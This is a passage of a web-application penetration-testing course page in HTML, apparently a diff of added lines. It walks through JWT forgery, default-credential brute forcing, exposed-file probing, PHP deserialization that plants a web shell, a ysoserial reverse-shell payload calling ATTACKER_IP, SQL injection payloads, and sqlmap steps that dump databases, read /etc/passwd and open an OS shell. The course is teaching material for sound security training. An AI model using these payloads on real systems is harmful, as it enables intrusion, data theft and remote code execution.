+<span class="cmd">gitleaks detect</span> <span class="flag">--source</span> ./target-repo <span class="flag">--report-format</span> json
+
+<span class="cm"># Check .env files, config files exposed in web root</span>
+<span class="cmd">curl</span> http://target.com/.env
+<span class="cmd">curl</span> http://target.com/config.php
+<span class="cmd">curl</span> http://target.com/.git/config
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">2</span>
+          <div class="sc">
+            <div class="st">JWT Security Testing — alg:none and weak secret attacks</div>
+            <div class="code" data-label="python3 — JWT attacks">
+<span class="cmd">pip3 install</span> pyjwt <span class="flag">--break-system-packages</span>
+            </div>
+            <div class="code" data-label="python3">
+<span class="kw">import</span> jwt, base64, json
+
+<span class="cm"># Decode JWT without verification (just read the claims)</span>
+token = <span class="str">"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMSIsInJvbGUiOiJ1c2VyIn0.sig"</span>
+h, p, s = token.split(<span class="str">"."</span>)
+payload = json.loads(base64.urlsafe_b64decode(p + <span class="str">"=="</span>))
+print(<span class="str">"Claims:"</span>, payload)  <span class="cm"># {'sub': 'user1', 'role': 'user'}</span>
+
+<span class="cm"># ATTACK 1: alg:none (no signature required)</span>
+new_header = base64.urlsafe_b64encode(json.dumps({<span class="str">"alg"</span>:<span class="str">"none"</span>,<span class="str">"typ"</span>:<span class="str">"JWT"</span>}).encode()).decode().rstrip(<span class="str">"="</span>)
+new_payload = base64.urlsafe_b64encode(json.dumps({<span class="str">"sub"</span>:<span class="str">"admin"</span>,<span class="str">"role"</span>:<span class="str">"admin"</span>}).encode()).decode().rstrip(<span class="str">"="</span>)
+forged = f<span class="str">"{new_header}.{new_payload}."</span>
+print(<span class="str">"Forged (alg:none):"</span>, forged)
+<span class="cm"># If server accepts this → broken JWT validation!</span>
+
+<span class="cm"># ATTACK 2: Brute force weak secret</span>
+<span class="kw">import</span> hmac, hashlib
+weak_secrets = [<span class="str">"secret"</span>, <span class="str">"password"</span>, <span class="str">"123456"</span>, <span class="str">"jwt_secret"</span>]
+<span class="kw">for</span> secret <span class="kw">in</span> weak_secrets:
+    <span class="kw">try</span>:
+        decoded = jwt.decode(token, secret, algorithms=[<span class="str">"HS256"</span>])
+        print(f<span class="str">"SECRET FOUND: {secret} → {decoded}"</span>)
+    <span class="kw">except</span>: pass
+<span class="cm"># Tool: jwt_tool.py or hashcat mode 16500 for wordlist attack</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">3</span>
+          <div class="sc">
+            <div class="st">Check for cleartext transmission and weak cookies</div>
+            <div class="code" data-label="bash + burp">
+<span class="cm"># Check if login page uses HTTP (not HTTPS)</span>
+<span class="cmd">curl</span> <span class="flag">-I</span> http://target.com/login
+<span class="cm"># If 200 OK on HTTP → credentials transmitted in cleartext = CRITICAL finding</span>
+
+<span class="cm"># Check if session cookie has Secure flag</span>
+<span class="cmd">curl</span> <span class="flag">-v -c /dev/null</span> http://target.com/login 2>&1 | <span class="cmd">grep</span> <span class="flag">-i</span> set-cookie
+<span class="cm"># Cookie without "Secure" flag → can be sent over HTTP (if mixed content)</span>
+<span class="cm"># Cookie without "HttpOnly" flag → accessible by JavaScript → XSS steals it</span>
+<span class="cm"># Cookie without "SameSite=Strict" → CSRF attacks possible</span>
+
+<span class="cm"># Check for sensitive data in localStorage (via browser console)</span>
+<span class="cm"># Browser → F12 → Console → type:</span>
+<span class="cm"># localStorage.getItem('token')  → If JWT/auth token stored here = risk</span>
+<span class="cm"># Accessible by ANY JavaScript on the page = XSS can steal it</span>
+            </div>
+          </div>
+        </li>
+      </ol>
+    </div>
+  </div>
+</div>
+
+<hr class="hdiv">
+
+<!-- ══════════════════
+08 — A05 Security Misconfiguration
+══════════════════ -->
+<div class="section" id="s8">
+  <div class="sec-head">
+    <span class="sec-num">08</span>
+    <div class="sec-meta">
+      <div class="sec-title">A05 — Security Misconfiguration</div>
+      <div class="sec-sub">Default credentials, directory listing, verbose errors, and debug endpoints</div>
+    </div>
+    <span class="badge b-amber">OWASP A05</span>
+  </div>
+
+  <div class="theory amber">
+    <h4>Misconfiguration — Easy to Find, Often Critical</h4>
+    <p>Security misconfigurations are among the easiest vulnerabilities to find and often yield the most dramatic results. A misconfigured server with directory listing enabled exposes all source files. A debug endpoint left active in production exposes database credentials. A phpMyAdmin console with default credentials gives full database access. These are not sophisticated vulnerabilities — they're oversights that automated scanners catch instantly.</p>
+  </div>
+
+  <div class="practical open">
+    <div class="prac-head" onclick="toggleP(this)">
+      <span class="ph-i">⚙️</span>
+      <span class="ph-t">Lab 8.1 — Discover misconfigurations: default creds, directory listing, verbose errors</span>
+      <span class="ph-tag pt-tool">Misconfiguration Lab</span>
+      <span class="ph-chev">▶</span>
+    </div>
+    <div class="prac-body">
+      <ol class="steps">
+        <li class="step">
+          <span class="sn">1</span>
+          <div class="sc">
+            <div class="st">Check for default credentials on management interfaces</div>
+            <div class="code" data-label="bash">
+<span class="cm"># Common management paths to test with default credentials</span>
+<span class="cm"># phpMyAdmin: admin/admin, root/(blank), phpmyadmin/phpmyadmin</span>
+<span class="cmd">curl</span> <span class="flag">-s</span> http://target/phpmyadmin/ | <span class="cmd">grep</span> <span class="flag">-i</span> <span class="val">"phpmyadmin"</span>
+<span class="cmd">curl</span> <span class="flag">-s</span> http://target/pma/ | <span class="cmd">grep</span> <span class="flag">-i</span> <span class="val">"phpmyadmin"</span>
+
+<span class="cm"># WordPress: admin/admin, admin/password</span>
+<span class="cmd">curl</span> <span class="flag">-s -X POST</span> http://target/wp-login.php \
+  <span class="flag">-d</span> <span class="val">"log=admin&pwd=admin&wp-submit=Log+In"</span> | <span class="cmd">grep</span> <span class="flag">-i</span> <span class="val">"dashboard"</span>
+
+<span class="cm"># Tomcat Manager: tomcat/tomcat, admin/admin, manager/manager</span>
+<span class="cmd">curl</span> <span class="flag">-u</span> tomcat:tomcat http://target:8080/manager/html
+
+<span class="cm"># Use Hydra for automated default credential testing</span>
+<span class="cmd">hydra</span> <span class="flag">-C</span> /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt \
+  target http-get /manager/html
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">2</span>
+          <div class="sc">
+            <div class="st">Directory listing and sensitive file exposure</div>
+            <div class="code" data-label="bash">
+<span class="cm"># Check for directory listing (no index.html in directory)</span>
+<span class="cmd">curl</span> <span class="flag">-s</span> http://target/uploads/ | <span class="cmd">grep</span> <span class="flag">-i</span> <span class="val">"index of"</span>
+<span class="cm"># "Index of /uploads" → directory listing enabled = file exposure</span>
+
+<span class="cm"># Check for sensitive files commonly exposed</span>
+<span class="cmd">for</span> file in .env .git/config config.php wp-config.php .htaccess backup.zip admin.zip \
+  database.sql dump.sql robots.txt sitemap.xml phpinfo.php test.php info.php; do
+  response=$(<span class="cmd">curl</span> <span class="flag">-s -o /dev/null -w "%{http_code}"</span> http://target/$file)
+  <span class="cmd">echo</span> "$response $file"
+done
+<span class="cm"># 200 for any sensitive file = finding!</span>
+
+<span class="cm"># Check phpinfo() - reveals server config, paths, PHP settings</span>
+<span class="cmd">curl</span> http://target/phpinfo.php | <span class="cmd">grep</span> <span class="flag">-i</span> <span class="val">"PHP Version"</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">3</span>
+          <div class="sc">
+            <div class="st">Trigger and capture verbose error messages</div>
+            <div class="code" data-label="bash + burp">
+<span class="cm"># Send invalid input to trigger errors</span>
+<span class="cmd">curl</span> http://target/page.php?id=INVALID
+<span class="cmd">curl</span> http://target/page.php?id=1'
+<span class="cmd">curl</span> http://target/page.php?id[]=1
+<span class="cmd">curl</span> <span class="flag">-X INVALID_METHOD</span> http://target/
+
+<span class="cm"># Check if error reveals:</span>
+<span class="cm"># - File paths: /var/www/html/includes/db.php line 42</span>
+<span class="cm"># - Database credentials: Could not connect to MySQL as 'root' at '127.0.0.1'</span>
+<span class="cm"># - Framework version: Laravel 8.12.0 in stack trace</span>
+<span class="cm"># - Server info: Apache/2.4.49 (Ubuntu) → check for CVEs</span>
+
+<span class="cm"># This information aids further exploitation - document as "Information Disclosure"</span>
+<span class="cm"># CVSS: MEDIUM → the info enables higher severity attacks</span>
+            </div>
+          </div>
+        </li>
+      </ol>
+    </div>
+  </div>
+</div>
+
+<hr class="hdiv">
+
+<!-- ══════════════════
+09 — A08 Insecure Deserialization
+══════════════════ -->
+<div class="section" id="s9">
+  <div class="sec-head">
+    <span class="sec-num">09</span>
+    <div class="sec-meta">
+      <div class="sec-title">A08 — Insecure Deserialization</div>
+      <div class="sec-sub">Object injection, RCE via gadget chains, and ysoserial exploitation</div>
+    </div>
+    <span class="badge b-red">OWASP A08</span>
+  </div>
+
+  <div class="theory red">
+    <h4>Insecure Deserialization — Often Remote Code Execution</h4>
+    <p><strong>Serialization</strong> converts an object (in memory) to a byte stream for storage or transmission. <strong>Deserialization</strong> reconstructs the object from that byte stream. When applications deserialize untrusted user-controlled data without validation, attackers can craft malicious serialized objects that, when deserialized, execute arbitrary code on the server — even without SQL injection or XSS.</p>
+    <p>This vulnerability affects Java (often via gadget chains in commons-collections), PHP (unserialize()), Python (pickle.loads()), and .NET (BinaryFormatter). It's often found in: session cookies, HTTP parameters, hidden form fields, API requests, and message queue payloads.</p>
+  </div>
+
+  <div class="practical open">
+    <div class="prac-head" onclick="toggleP(this)">
+      <span class="ph-i">🧪</span>
+      <span class="ph-t">Lab 9.1 — PHP Object Injection and detection techniques</span>
+      <span class="ph-tag pt-lab">Deserialization Lab</span>
+      <span class="ph-chev">▶</span>
+    </div>
+    <div class="prac-body">
+      <ol class="steps">
+        <li class="step">
+          <span class="sn">1</span>
+          <div class="sc">
+            <div class="st">Identify serialized data in HTTP traffic</div>
+            <div class="code" data-label="bash — identification">
+<span class="cm"># PHP serialized data looks like: a:2:{s:4:"user";s:5:"admin";s:4:"role";s:4:"user";}</span>
+<span class="cm"># Java serialized data starts with: ac ed 00 05 (hex) or rO0AB (base64)</span>
+<span class="cm"># Python pickle starts with: 0x80 0x04 or \x80\x04</span>
+
+<span class="cm"># Check cookies and parameters for serialized data patterns</span>
+<span class="cmd">curl</span> <span class="flag">-v</span> http://target/login -d <span class="val">"user=admin&pass=admin"</span> 2>&1 | \
+  <span class="cmd">grep</span> <span class="flag">-i</span> <span class="val">"set-cookie"</span>
+<span class="cm"># If cookie value looks like: rO0ABXNyAB... = Java serialized object!</span>
+
+<span class="cm"># Decode to check</span>
+<span class="cmd">echo</span> <span class="val">"rO0ABXNy..."</span> | <span class="cmd">base64</span> <span class="flag">-d</span> | <span class="cmd">xxd</span> | <span class="cmd">head</span>
+<span class="cm"># Look for: "ac ed 00 05" at start = Java serialized</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">2</span>
+          <div class="sc">
+            <div class="st">PHP Object Injection — WebGoat Lab</div>
+            <div class="code" data-label="php deserialization">
+<span class="cm"># Vulnerable PHP code:</span>
+<span class="cm"># $obj = unserialize($_COOKIE['data']);</span>
+<span class="cm"># echo $obj->name;</span>
+
+<span class="cm"># If a class has a __destruct() or __wakeup() magic method</span>
+<span class="cm"># with dangerous operations, we can inject a crafted object</span>
+
+<span class="cm"># Craft a malicious PHP serialized object</span>
+<span class="cmd">php</span> <span class="flag">-r</span> <span class="val">'
+class Logger {
+  public $logFile = "/var/www/html/shell.php";
+  public $initMsg = "&lt;?php system(\$_GET[\"cmd\"]); ?&gt;";
+}
+$obj = new Logger();
+echo serialize($obj);
+'</span>
+<span class="cm"># Output: O:6:"Logger":2:{s:7:"logFile";s:26:"/var/www/html/shell.php";s:7:"initMsg";s:35:"..."}</span>
+<span class="cm"># Send this as the cookie value → when deserialized, writes web shell</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">3</span>
+          <div class="sc">
+            <div class="st">Java Deserialization with ysoserial (concept + demo)</div>
+            <div class="code" data-label="bash — ysoserial">
+<span class="cm"># ysoserial generates serialized payloads that exploit Java gadget chains</span>
+<span class="cmd">wget</span> https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar
+
+<span class="cm"># Generate a reverse shell payload using CommonsCollections1 gadget</span>
+<span class="cmd">java -jar</span> ysoserial-all.jar CommonsCollections1 \
+  <span class="val">"ncat ATTACKER_IP 4444 -e /bin/bash"</span> | <span class="cmd">base64</span> > payload.b64
+
+<span class="cm"># Send as a cookie or parameter that gets deserialized</span>
+<span class="cm"># (exact delivery depends on where the app deserializes)</span>
+<span class="cmd">curl</span> http://target/vulnerable-endpoint \
+  <span class="flag">-H</span> <span class="val">"Cookie: data=$(cat payload.b64)"</span>
+
+<span class="cm"># Start listener first:</span>
+<span class="cmd">nc -lvnp</span> 4444
+<span class="cm"># → Reverse shell if target is vulnerable</span>
+            </div>
+          </div>
+        </li>
+      </ol>
+    </div>
+  </div>
+</div>
+
+<hr class="hdiv">
+
+<!-- ══════════════════
+10 — A09 Outdated Components
+══════════════════ -->
+<div class="section" id="s10">
+  <div class="sec-head">
+    <span class="sec-num">10</span>
+    <div class="sec-meta">
+      <div class="sec-title">A09 — Vulnerable & Outdated Components</div>
+      <div class="sec-sub">CVE identification, SCA tools, version fingerprinting, and exploit research</div>
+    </div>
+    <span class="badge b-amber">OWASP A09</span>
+  </div>
+
+  <div class="theory amber">
+    <h4>Component Vulnerabilities — Wide Impact, Easy to Find</h4>
+    <p>Modern applications use hundreds of third-party components — npm packages, Maven dependencies, Python pip packages, WordPress plugins, jQuery libraries. When any of these has a known CVE, every application using it inherits that vulnerability. <strong>Log4Shell (CVE-2021-44228)</strong> affected millions of applications because Log4j was embedded in thousands of Java applications worldwide.</p>
+  </div>
+
+  <div class="practical open">
+    <div class="prac-head" onclick="toggleP(this)">
+      <span class="ph-i">🧩</span>
+      <span class="ph-t">Lab 10.1 — Identify vulnerable components and find exploits</span>
+      <span class="ph-tag pt-tool">Component Analysis</span>
+      <span class="ph-chev">▶</span>
+    </div>
+    <div class="prac-body">
+      <ol class="steps">
+        <li class="step">
+          <span class="sn">1</span>
+          <div class="sc">
+            <div class="st">Fingerprint technology stack with Wappalyzer and WhatWeb</div>
+            <div class="code" data-label="bash">
+<span class="cm"># WhatWeb — command-line technology fingerprinting</span>
+<span class="cmd">whatweb</span> http://testphp.vulnweb.com/
+<span class="cm"># Reveals: Apache/2.4, PHP/5.x, jQuery/1.x, OS: Ubuntu</span>
+<span class="cm"># Every version identified → check for CVEs</span>
+
+<span class="cmd">whatweb</span> <span class="flag">-v</span> http://testphp.vulnweb.com/  <span class="cm"># verbose output</span>
+<span class="cmd">whatweb</span> <span class="flag">-a 3</span> http://testphp.vulnweb.com/ <span class="cm"># aggressive mode</span>
+
+<span class="cm"># Check HTTP headers for version info</span>
+<span class="cmd">curl</span> <span class="flag">-I</span> http://testphp.vulnweb.com/ | <span class="cmd">grep</span> <span class="flag">-i</span> <span class="val">"server\|x-powered"</span>
+<span class="cm"># Server: Apache/2.4.7 (Ubuntu)</span>
+<span class="cm"># X-Powered-By: PHP/5.4.45</span>
+<span class="cm"># PHP 5.4.45 = EXTREMELY outdated, hundreds of CVEs</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">2</span>
+          <div class="sc">
+            <div class="st">Research CVEs for identified versions</div>
+            <div class="code" data-label="bash — CVE research">
+<span class="cm"># Search CVEs for identified software on NVD</span>
+<span class="cm"># https://nvd.nist.gov/vuln/search → search "Apache 2.4.7"</span>
+<span class="cm"># https://cve.mitre.org → search CVEs</span>
+
+<span class="cm"># Search Exploit-DB for ready-made exploits</span>
+<span class="cmd">searchsploit</span> apache 2.4.7
+<span class="cmd">searchsploit</span> php 5.4
+<span class="cm"># Shows available exploits with their paths</span>
+
+<span class="cm"># Get exploit details</span>
+<span class="cmd">searchsploit</span> <span class="flag">-x</span> exploits/php/webapps/12345.php
+
+<span class="cm"># Install nuclei for automated CVE scanning</span>
+<span class="cmd">go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest</span>
+<span class="cmd">nuclei</span> <span class="flag">-u</span> http://testphp.vulnweb.com/ <span class="flag">-severity</span> critical,high
+<span class="cm"># Runs thousands of templates including CVE checks</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">3</span>
+          <div class="sc">
+            <div class="st">OWASP Dependency Check for application dependencies</div>
+            <div class="code" data-label="bash">
+<span class="cm"># Install OWASP Dependency Check</span>
+<span class="cmd">wget</span> https://github.com/jeremylong/DependencyCheck/releases/download/v9.0.0/dependency-check-9.0.0-release.zip
+<span class="cmd">unzip</span> dependency-check-9.0.0-release.zip
+
+<span class="cm"># Scan a Java application's dependencies</span>
+<span class="cmd">./dependency-check/bin/dependency-check.sh</span> \
+  <span class="flag">--project</span> <span class="val">"TargetApp"</span> \
+  <span class="flag">--scan</span> /path/to/app/WEB-INF/lib/ \
+  <span class="flag">--format</span> HTML \
+  <span class="flag">--out</span> ./dependency-report
+
+<span class="cm"># For Node.js projects</span>
+<span class="cmd">npm audit</span>
+<span class="cmd">npm audit fix</span>
+
+<span class="cm"># For Python projects</span>
+<span class="cmd">pip3 install</span> safety <span class="flag">--break-system-packages</span>
+<span class="cmd">safety check</span> <span class="flag">-r</span> requirements.txt
+            </div>
+          </div>
+        </li>
+      </ol>
+    </div>
+  </div>
+</div>
+
+<hr class="hdiv">
+
+<!-- ══════════════════
+11 — Burp Suite Mastery
+══════════════════ -->
+<div class="section" id="s11">
+  <div class="sec-head">
+    <span class="sec-num">11</span>
+    <div class="sec-meta">
+      <div class="sec-title">Burp Suite — Full Workflow Mastery</div>
+      <div class="sec-sub">Proxy, Repeater, Intruder, Scanner, Decoder, and Collaborator</div>
+    </div>
+    <span class="badge b-mag">Core Tool</span>
+  </div>
+
+  <div class="theory">
+    <h4>Burp Suite — The Web Tester's Primary Weapon</h4>
+    <p><strong>Burp Suite</strong> is the industry-standard web application security testing platform. It sits between your browser and the target, intercepting and allowing modification of every HTTP request and response. Every professional web application penetration test uses Burp Suite. The Community edition (free) covers everything in this module.</p>
+  </div>
+
+  <div class="burp-flow">
+    <div class="bf-step active">
+      <div class="bf-n">Step 1</div>
+      <div class="bf-t">Proxy</div>
+      <div class="bf-d">Intercept and forward/modify all HTTP traffic between browser and server. Core of all Burp work.</div>
+    </div>
+    <div class="bf-step">
+      <div class="bf-n">Step 2</div>
+      <div class="bf-t">Target</div>
+      <div class="bf-d">Site map of all discovered URLs, endpoints, and parameters. Foundation for testing coverage.</div>
+    </div>
+    <div class="bf-step">
+      <div class="bf-n">Step 3</div>
+      <div class="bf-t">Repeater</div>
+      <div class="bf-d">Resend any request with manual modifications. The workhorse for manual exploitation testing.</div>
+    </div>
+    <div class="bf-step">
+      <div class="bf-n">Step 4</div>
+      <div class="bf-t">Intruder</div>
+      <div class="bf-d">Automated fuzzing and brute force. Mark injection points, provide payloads, analyse responses.</div>
+    </div>
+    <div class="bf-step">
+      <div class="bf-n">Step 5</div>
+      <div class="bf-t">Decoder</div>
+      <div class="bf-d">Encode/decode Base64, URL, HTML, Hex, Gzip. Essential for understanding and crafting payloads.</div>
+    </div>
+    <div class="bf-step active">
+      <div class="bf-n">Step 6</div>
+      <div class="bf-t">Collaborator</div>
+      <div class="bf-d">Out-of-band interaction testing. Detects SSRF, blind XSS, XXE where no in-band response exists.</div>
+    </div>
+  </div>
+
+  <div class="practical open">
+    <div class="prac-head" onclick="toggleP(this)">
+      <span class="ph-i">🕷️</span>
+      <span class="ph-t">Lab 11.1 — Burp Suite complete workflow: intercept → Repeater → Intruder</span>
+      <span class="ph-tag pt-tool">Burp Lab</span>
+      <span class="ph-chev">▶</span>
+    </div>
+    <div class="prac-body">
+      <ol class="steps">
+        <li class="step">
+          <span class="sn">1</span>
+          <div class="sc">
+            <div class="st">Configure Burp proxy and browser</div>
+            <div class="code" data-label="setup">
+<span class="cm"># Burp Suite → Proxy → Options → set Proxy listener: 127.0.0.1:8080</span>
+<span class="cm"># Burp Certificate installation (for HTTPS):</span>
+<span class="cm"># Browser → proxy 127.0.0.1:8080 → visit http://burp → Download CA certificate</span>
+<span class="cm"># Firefox: Settings → Privacy → Certificates → Import → select PortSwigger CA</span>
+
+<span class="cm"># Quick setup: use Burp's embedded Chromium browser</span>
+<span class="cm"># Burp → Proxy → Intercept → Open Browser</span>
+<span class="cm"># This browser is already configured with Burp as proxy + CA trusted</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">2</span>
+          <div class="sc">
+            <div class="st">Intercept and modify a login request</div>
+            <div class="code" data-label="burp proxy">
+<span class="cm"># 1. Enable Intercept: Proxy → Intercept → "Intercept is ON"</span>
+<span class="cm"># 2. Submit login form in browser with admin/wrongpassword</span>
+<span class="cm"># 3. Burp catches the request BEFORE it's sent</span>
+<span class="cm"># You see raw HTTP:</span>
+
+POST /dvwa/login.php HTTP/1.1
+Host: localhost:8080
+Content-Type: application/x-www-form-urlencoded
+
+username=<span class="hi">admin</span>&password=<span class="hi">wrongpassword</span>&Login=Login
+
+<span class="cm"># 4. Modify password in Burp, click "Forward"</span>
+<span class="cm"># Change "wrongpassword" to "password"</span>
+<span class="cm"># 5. The server gets the modified request → you're logged in!</span>
+
+<span class="cm"># Send to Repeater: Ctrl+R (or right-click → Send to Repeater)</span>
+<span class="cm"># Now you can replay this request as many times as needed with modifications</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">3</span>
+          <div class="sc">
+            <div class="st">Repeater — test SQLi manually</div>
+            <div class="code" data-label="burp repeater">
+<span class="cm"># In Repeater: Send SQLi payloads and observe responses</span>
+<span class="cm"># Original request to DVWA SQLi:</span>
+GET /dvwa/vulnerabilities/sqli/?id=<span class="warn">1</span>&Submit=Submit HTTP/1.1
+
+<span class="cm"># Test 1: single quote</span>
+GET /dvwa/vulnerabilities/sqli/?id=<span class="hi">1'</span>&Submit=Submit HTTP/1.1
+<span class="cm"># Response shows SQL error → injectable</span>
+
+<span class="cm"># Test 2: always true</span>
+GET /dvwa/vulnerabilities/sqli/?id=<span class="hi">1' OR '1'='1</span>&Submit=Submit HTTP/1.1
+<span class="cm"># Response shows ALL users → confirmed SQLi</span>
+
+<span class="cm"># Test 3: UNION SELECT to extract database version</span>
+GET /dvwa/vulnerabilities/sqli/?id=<span class="hi">1' UNION SELECT version(),user()--</span>&Submit=Submit HTTP/1.1
+<span class="cm"># Response contains DB version and user → data extraction</span>
+
+<span class="cm"># Repeater shows: request on left, response on right</span>
+<span class="cm"># Compare responses for changes → confirms injection</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">4</span>
+          <div class="sc">
+            <div class="st">Intruder — automated brute force</div>
+            <div class="code" data-label="burp intruder">
+<span class="cm"># Send login request to Intruder: Ctrl+I</span>
+<span class="cm"># In Intruder → Positions tab:</span>
+<span class="cm"># Click "Clear §" first</span>
+<span class="cm"># Select "password" value → click "Add §"</span>
+<span class="cm"># Positions now shows: username=admin&password=§wrongpassword§</span>
+
+<span class="cm"># Payloads tab:</span>
+<span class="cm"># Type: Simple list</span>
+<span class="cm"># Paste common passwords: password, 123456, admin, letmein, qwerty</span>
+<span class="cm"># Or load from file: /usr/share/wordlists/rockyou.txt (caution: slow!)</span>
+
+<span class="cm"># Attack → Sniper (single position, one payload at a time)</span>
+<span class="cm"># Watch results table → Status code column</span>
+<span class="cm"># 302 redirect (different from 200 error page) = successful login</span>
+
+<span class="cm"># Community Burp rate-limits Intruder — upgrade or use FFUF for speed</span>
+<span class="cmd">ffuf</span> <span class="flag">-u</span> http://localhost:8080/dvwa/login.php \
+  <span class="flag">-X POST</span> \
+  <span class="flag">-d</span> <span class="val">"username=admin&password=FUZZ&Login=Login"</span> \
+  <span class="flag">-w</span> /usr/share/wordlists/rockyou.txt \
+  <span class="flag">-mr</span> <span class="val">"Welcome"</span>
+            </div>
+          </div>
+        </li>
+      </ol>
+    </div>
+  </div>
+</div>
+
+<hr class="hdiv">
+
+<!-- ══════════════════
+12 — sqlmap Automation
+══════════════════ -->
+<div class="section" id="s12">
+  <div class="sec-head">
+    <span class="sec-num">12</span>
+    <div class="sec-meta">
+      <div class="sec-title">sqlmap — SQL Injection Automation</div>
+      <div class="sec-sub">Detection, exploitation, database dumping, and OS shell escalation</div>
+    </div>
+    <span class="badge b-mag">Tool</span>
+  </div>
+
+  <div class="theory">
+    <h4>sqlmap — The Gold Standard for SQLi Testing</h4>
+    <p><strong>sqlmap</strong> is an open-source penetration testing tool that automates the detection and exploitation of SQL injection vulnerabilities. It supports all major database management systems (MySQL, PostgreSQL, Oracle, MSSQL, SQLite), all injection types (error-based, UNION, blind, time-based, stacked), and can extract databases, tables, columns, data, and in some configurations — achieve OS command execution.</p>
+  </div>
+
+  <div class="practical open">
+    <div class="prac-head" onclick="toggleP(this)">
+      <span class="ph-i">🐍</span>
+      <span class="ph-t">Lab 12.1 — sqlmap complete workflow: detect → dump → shell</span>
+      <span class="ph-tag pt-tool">sqlmap Lab</span>
+      <span class="ph-chev">▶</span>
+    </div>
+    <div class="prac-body">
+      <ol class="steps">
+        <li class="step">
+          <span class="sn">1</span>
+          <div class="sc">
+            <div class="st">Basic SQLi detection</div>
+            <div class="code" data-label="bash">
+<span class="cm"># Test a URL parameter for SQLi</span>
+<span class="cmd">sqlmap</span> <span class="flag">-u</span> <span class="val">"http://localhost:8080/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"</span> \
+  <span class="flag">--cookie</span>=<span class="val">"PHPSESSID=YOUR_SESSION;security=low"</span>
+
+<span class="cm"># sqlmap asks questions — batch mode answers all with defaults</span>
+<span class="cmd">sqlmap</span> <span class="flag">-u</span> <span class="val">"..."</span> <span class="flag">--cookie</span>=<span class="val">"..."</span> <span class="flag">--batch</span>
+
+<span class="cm"># Test POST parameters</span>
+<span class="cmd">sqlmap</span> <span class="flag">-u</span> <span class="val">"http://target.com/login"</span> \
+  <span class="flag">--data</span>=<span class="val">"username=admin&password=test"</span> \
+  <span class="flag">-p</span> username  <span class="cm"># specify which parameter to test</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">2</span>
+          <div class="sc">
+            <div class="st">Database enumeration and data extraction</div>
+            <div class="code" data-label="bash">
+<span class="cm"># List all databases</span>
+<span class="cmd">sqlmap</span> <span class="flag">-u</span> <span class="val">"URL"</span> <span class="flag">--cookie="..." --dbs --batch</span>
+<span class="cm"># Output: available databases: [dvwa, information_schema, mysql]</span>
+
+<span class="cm"># List tables in a specific database</span>
+<span class="cmd">sqlmap</span> <span class="flag">-u</span> <span class="val">"URL"</span> <span class="flag">--cookie="..."</span> <span class="flag">-D</span> dvwa <span class="flag">--tables --batch</span>
+<span class="cm"># Output: Database: dvwa → [guestbook, users]</span>
+
+<span class="cm"># List columns of users table</span>
+<span class="cmd">sqlmap</span> <span class="flag">-u</span> <span class="val">"URL"</span> <span class="flag">--cookie="..."</span> <span class="flag">-D</span> dvwa <span class="flag">-T</span> users <span class="flag">--columns --batch</span>
+
+<span class="cm"># Dump the entire users table</span>
+<span class="cmd">sqlmap</span> <span class="flag">-u</span> <span class="val">"URL"</span> <span class="flag">--cookie="..."</span> <span class="flag">-D</span> dvwa <span class="flag">-T</span> users <span class="flag">--dump --batch</span>
+<span class="cm"># sqlmap also attempts to crack discovered hashes automatically</span>
+
+<span class="cm"># Dump specific columns only</span>
+<span class="cmd">sqlmap</span> <span class="flag">-u</span> <span class="val">"URL"</span> <span class="flag">--cookie="..."</span> <span class="flag">-D</span> dvwa <span class="flag">-T</span> users \
+  <span class="flag">-C</span> <span class="val">"user,password"</span> <span class="flag">--dump --batch</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">3</span>
+          <div class="sc">
+            <div class="st">OS shell escalation (when DB user has FILE privilege)</div>
+            <div class="code" data-label="bash">
+<span class="cm"># Check current database user's privileges</span>
+<span class="cmd">sqlmap</span> <span class="flag">-u</span> <span class="val">"URL"</span> <span class="flag">--cookie="..." --privileges --batch</span>
+
+<span class="cm"># If FILE privilege exists, read OS files:</span>
+<span class="cmd">sqlmap</span> <span class="flag">-u</span> <span class="val">"URL"</span> <span class="flag">--cookie="..."</span> <span class="flag">--file-read</span>=<span class="val">"/etc/passwd"</span> <span class="flag">--batch</span>
+
+<span class="cm"># Write a web shell (if INTO OUTFILE privilege + web root writable):</span>
+<span class="cmd">sqlmap</span> <span class="flag">-u</span> <span class="val">"URL"</span> <span class="flag">--cookie="..."</span> \
+  <span class="flag">--file-write</span>=<span class="val">"./shell.php"</span> \
+  <span class="flag">--file-dest</span>=<span class="val">"/var/www/html/shell.php"</span> <span class="flag">--batch</span>
+<span class="cm"># shell.php: &lt;?php system($_GET["cmd"]); ?&gt;</span>
+
+<span class="cm"># Interactive OS shell (if all conditions met)</span>
+<span class="cmd">sqlmap</span> <span class="flag">-u</span> <span class="val">"URL"</span> <span class="flag">--cookie="..." --os-shell --batch</span>
+<span class="cm"># Drops you into an interactive shell on the target server</span>
+            </div>
+          </div>
+        </li>
+        <li class="step">
+          <span class="sn">4</span>
+          <div class="sc">
+            <div class="st">Advanced sqlmap options for real engagements</div>
+            <div class="code" data-label="bash">
+<span class="cm"># Use Burp request file (save raw HTTP from Burp → file)</span>
+<span class="cmd">sqlmap</span> <span class="flag">-r</span> request.txt <span class="flag">--batch</span>
+
+<span class="cm"># Increase speed and detection level</span>
+<span class="cmd">sqlmap</span> <span class="flag">-u</span> <span class="val">"URL"</span> <span class="flag">--cookie="..."</span> \
+  <span class="flag">--level</span> 5 <span class="flag">--risk</span> 3 \      <span class="cm"># higher = more tests (more noise)</span>
+  <span class="flag">--threads</span> 4 \           <span class="cm"># parallel requests</span>
